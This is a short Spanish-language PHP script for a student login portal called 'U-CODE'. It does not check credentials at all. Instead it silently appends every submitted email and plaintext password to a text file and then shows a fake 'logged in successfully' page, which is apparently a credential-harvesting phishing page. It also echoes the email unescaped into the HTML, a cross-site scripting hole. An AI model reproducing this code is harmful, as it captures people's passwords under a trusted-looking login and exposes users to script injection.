<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $email    = $_POST['email'];
    $password = $_POST['password'];
    $fecha    = date("Y-m-d H:i:s"); 
    $lineaData = "login_intento:\n" . 
                 $fecha . "\n" . 
                 $email . "\n" . 
                 $password . "\n" . 
                 "---------------------------------------------------------------\n";

    if (file_put_contents("logins.txt", $lineaData, FILE_APPEND)) {
        echo "
        <!DOCTYPE html>
        <html lang='es'>
        <head>
            <meta charset='UTF-8'>
            <title>Portal del Alumno - U-CODE</title>
            <link rel='stylesheet' href='style.css'>
            <style>
                .msg-bienvenida { text-align: center; max-width: 550px; margin: 100px auto; padding: 40px; background: white; border-radius: 15px; box-shadow: 0 4px 20px rgba(74, 46, 128, 0.1); border-top: 5px solid var(--violeta-principal, #6C4AB6); }
                h2 { color: var(--violeta-oscuro, #4A2E80); font-family: 'Playfair Display', serif; margin-bottom: 15px; font-size: 2rem; }
                p { font-family: 'Urbanist', sans-serif; color: var(--marron-oscuro, #3E2723); font-size: 1.1rem; margin-bottom: 25px; }
                .btn-portal { display: inline-block; background-color: #3E2723; color: white; padding: 12px 25px; text-decoration: none; border-radius: 25px; font-weight: bold; transition: background-color 0.3s; }
                .btn-portal:hover { background-color: #6C4AB6; }
            </style>
        </head>
        <body>
            <div class='msg-bienvenida'>
                <h2>¡Bienvenido al Portal de U-CODE!</h2>
                <p>Has iniciado sesión exitosamente con el correo:<br><strong>$email</strong></p>
                <a href='pagprincipal.html' class='btn-portal'>Ir a mi Panel de Estudios</a>
            </div>
        </body>
        </html>";
    } else {
        echo "Hubo problemas técnicos al conectar con el portal de alumnos.";
    }

} else {
    header("Location: pagprincipal.html");
    exit();
}
?>